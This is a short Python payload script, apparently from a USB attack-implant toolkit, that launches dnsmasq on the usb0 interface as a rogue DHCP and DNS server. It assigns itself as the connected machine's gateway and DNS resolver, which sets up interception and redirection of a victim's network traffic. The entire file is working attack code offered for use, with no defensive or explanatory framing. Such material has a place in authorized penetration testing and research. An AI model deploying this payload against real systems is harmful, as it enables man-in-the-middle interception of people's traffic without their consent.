# File: payloads/network/rogue_dhcp_dns.py
import subprocess

print("[*] Starting rogue DHCP and DNS service using dnsmasq")
subprocess.run([
    "dnsmasq",
    "--interface=usb0",
    "--dhcp-range=10.13.37.10,10.13.37.100,12h",
    "--dhcp-option=3,10.13.37.1",
    "--dhcp-option=6,10.13.37.1"
])
